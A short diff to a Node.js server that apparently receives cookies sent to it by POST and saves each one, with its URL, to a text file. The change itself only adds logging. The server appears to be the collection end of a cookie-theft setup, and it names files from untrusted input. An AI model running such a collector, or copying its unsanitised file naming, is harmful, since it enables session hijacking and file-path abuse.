@@ -15,13 +15,14 @@ var server = http.createServer(function(request, response){
 	var str = '';
 	if (request.method === 'POST'){
 		URLStorage.push(url);
+		console.log(URLStorage)
 		request.on('data', function(chunk){
 			str += chunk;
 		});
 		request.on('end', function(){
 			fs.writeFile(str + '.txt', 'url: ' + url + '\n' + 'cookie: ' + str, function(err){
 				if (err){
-					console.log(err);
+					console.log('Here is your error: ' + err);
 				} else {
 					console.log('Cookie Saved');
 				}
